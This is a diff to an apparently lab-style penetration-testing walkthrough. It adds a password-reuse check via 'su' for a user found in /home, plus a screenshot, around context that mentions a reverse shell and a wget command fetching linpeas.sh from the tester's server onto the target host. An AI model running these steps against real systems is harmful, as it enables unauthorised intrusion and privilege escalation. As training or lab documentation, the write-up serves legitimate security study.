@@ -578,6 +578,12 @@ And we get the reverse shell!
 
 <img width="938" height="199" alt="image" src="https://github.com/user-attachments/assets/5fe44af7-0c8a-48a5-acf2-d99daa059ab9" />
 
+14. After looking at the `/home` directory, we notice the user `james` is on this machine as well. We check if he reused his Wordpress password for his local account as well using `su`
+
+```
+
+```
+
 14. We will do some basic privesc enumeration by transferring over the `linpeas.sh` script. We start a python server on our local machine and use wget to download the script onto WEB-NIX01.
 
 `wget http://[IP]/linpeas.sh`
@@ -594,4 +600,5 @@ And we get the reverse shell!
 
 <img width="360" height="149" alt="image" src="https://github.com/user-attachments/assets/6b7d8b83-df77-4985-a385-6614b6e89a62" />
 
-17. 
+17. <img width="824" height="351" alt="image" src="https://github.com/user-attachments/assets/48dfe571-71c0-419b-ad17-e27371c2028c" />
+
